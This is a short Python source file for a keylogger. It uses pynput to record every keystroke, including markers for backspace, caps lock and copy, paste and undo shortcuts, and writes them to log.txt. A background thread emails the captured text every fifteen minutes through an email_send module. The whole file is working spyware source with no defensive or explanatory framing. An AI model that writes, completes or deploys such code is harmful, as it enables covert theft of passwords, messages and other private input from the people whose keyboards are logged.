from pynput.keyboard import Listener
from threading import Thread
import email_send
from time import sleep

#string which will contain all the pressed keys ( to be send by email )
input_string = ''

def log_keystroke(key):
    global input_string
    pressed = str(key).replace("'", "")
    
    #check if a "special" key is pressed and only add what could be useful
    if pressed.startswith("Key."):
        if pressed == "Key.backspace":
            pressed = ' $BACKSPACE '
        elif pressed == 'Key.space':
            pressed = ' '
        elif pressed == "Key.enter":
            pressed = '\n'
        elif pressed == 'Key.caps_lock':
            pressed = ' $CAPS_LOCKED '
        else:
            pressed = ''
    elif pressed.startswith('\\x'):
        #check if the user is using keyboard shortcuts
        if pressed == "\\x03":
            pressed = ' $COPY '
        if pressed == "\\x16":
            pressed = ' $PASTE '
        if pressed == "\\x1a":
            pressed = ' $UNDO '
    
    input_string = input_string + pressed
    #print(input_string)
    with open("log.txt", 'a',encoding='utf-8') as f:
        f.write(pressed)

def report():
    while True:
        global input_string
        email_send.sendmail("email", "pwd", input_string)
        input_string = ""
        #sleep for 15 min
        sleep(900)
   

def start_listener():
    with Listener(on_press=log_keystroke) as l:
        l.join()

def start_timer():
    #start the thread that sends email every x seconds
    thread = Thread(target = report)
    thread.start()
    